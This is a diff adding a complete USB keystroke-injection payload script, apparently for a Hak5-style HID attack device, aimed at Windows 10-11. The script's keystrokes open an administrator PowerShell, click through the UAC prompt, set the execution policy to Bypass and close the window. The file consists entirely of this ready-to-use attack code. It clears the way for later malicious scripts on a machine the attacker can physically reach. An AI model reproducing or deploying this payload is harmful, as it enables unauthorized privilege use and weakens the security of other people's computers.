@@ -1,0 +1,36 @@
+####################################################################################
+#                                                                                  #
+# Title        : Starting a PowerShell with administrator permissions in Windows   #
+# Author       : Aleff                                                             #
+# Version      : 1.0                                                               #
+# Category     : Execute                                                           #
+# Target       : Windows 10-11                                                     #
+#                                                                                  #
+####################################################################################
+
+ATTACKMODE HID
+
+# Requirements:
+#     - Nothing
+
+QUACK DELAY 1000
+QUACK GUI x
+QUACK DELAY 500
+QUACK STRING a
+QUACK DELAY 500
+QUACK LEFT_ARROW
+QUACK DELAY 500
+QUACK ENTER
+
+QUACK DELAY 2000
+QUACK STRING Get-ExecutionPolicy -List
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING Set-ExecutionPolicy Bypass
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING Get-ExecutionPolicy -List
+QUACK ENTER
+QUACK DELAY 500
+
+QUACK ALT F4
